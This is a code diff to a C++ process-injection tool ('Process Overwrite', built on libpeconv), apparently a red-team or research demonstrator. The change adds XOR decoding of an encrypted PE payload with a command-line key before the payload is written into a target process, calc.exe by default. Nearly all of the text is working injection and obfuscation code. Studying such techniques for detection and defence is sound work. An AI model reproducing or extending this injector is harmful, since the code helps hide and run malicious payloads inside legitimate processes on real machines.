@@ -67,6 +67,12 @@ bool process_overwrite(PROCESS_INFORMATION &pi, BYTE* payloadBuf, DWORD payloadS
     return true;
 }
 
+void decode_payload(BYTE* buffer, size_t size, BYTE* key, size_t key_size)
+{
+    for (size_t i = 0; i < size; i++) {
+        buffer[i] ^= key[i % key_size];
+    }
+}
 
 int main(int argc, char* argv[])
 {
@@ -75,38 +81,48 @@ int main(int argc, char* argv[])
 #else
     const bool is32bit = true;
 #endif
-    if (argc < 2) {
-
+    if (argc < 4) {
         std::cout << "Process Overwrite (";
-
         if (is32bit) std::cout << "32bit";
         else std::cout << "64bit";
         std::cout << ")\n";
-        std::cout << "params: <payload path> [*target path]\n";
-        std::cout << "* - optional" << std::endl;
-        system("pause");
-        return 0;
+        std::cout << "params: <payload path> [*key] [*target path]\n" << std::endl;
+        if (argc < 2) {
+            system("pause");
+            return 0;
+        }
+        std::cout << "---\n" << std::endl;
     }
+    bool useDefaultTarget = true;
     char defaultTarget[MAX_PATH] = { 0 };
-    bool useDefaultTarget = (argc > 2) ? false : true;
-    char* targetPath = (argc > 2) ? argv[2] : defaultTarget;
-
+    char* targetPath = defaultTarget;
+    if (argc >= 4) {
+        targetPath = argv[3];
+        useDefaultTarget = false;
+    }
     char* payloadPath = argv[1];
-    size_t payloadSize = 0;
-
+    size_t bufsize = 0;
     // load the payload:
-    BYTE* payloadBuf = peconv::load_pe_module(payloadPath, payloadSize, false, false);
-    if (payloadBuf == NULL) {
-        std::cerr << "Cannot read payload!" << std::endl;
+    BYTE* buffer = peconv::load_file(payloadPath, bufsize);
+    if (!buffer) {
+        std::cerr << "Cannot read file:" << payloadPath << std::endl;
         return -1;
     }
-    /*
-    // if the file is NOT dropped on the disk, you can load it directly from a memory buffer:
-    BYTE* payloadBuf = peconv::load_pe_module(buffer, bufsize, payloadSize);
-    */
-    
-    size_t paylImgSize = peconv::get_image_size(payloadBuf);
+    if (argc >= 3) {
+        std::string key = argv[2];
+        if (key.length()) {
+            decode_payload(buffer, bufsize, (BYTE*)key.c_str(), key.length());
+            std::cout << "[+] Decoded with key: " << key << std::endl;
+        }
+    }
+    size_t payloadSize = 0;
+    BYTE* payloadBuf = peconv::load_pe_module(buffer, bufsize, payloadSize, false, false);
+    if (!payloadBuf) {
+        std::cerr << "Not a valid PE file!" << std::endl;
+        return -1;
+    }
 
+    size_t paylImgSize = peconv::get_image_size(payloadBuf);
     bool isPayl32b = !peconv::is64bit(payloadBuf);
     if (is32bit && !isPayl32b) {
         std::cout << "[ERROR] The injector (32 bit) is not compatibile with the payload (64 bit)\n";
@@ -117,7 +133,7 @@ int main(int argc, char* argv[])
     if (useDefaultTarget) {
         get_calc_path(defaultTarget, MAX_PATH, isPayl32b);
     }
-
+    std::cout << "[+] Target: " << targetPath << std::endl;
     bool isTarget32b = true;
     size_t targetImgSize = 0;
     // fetch target info to check the compatibility:
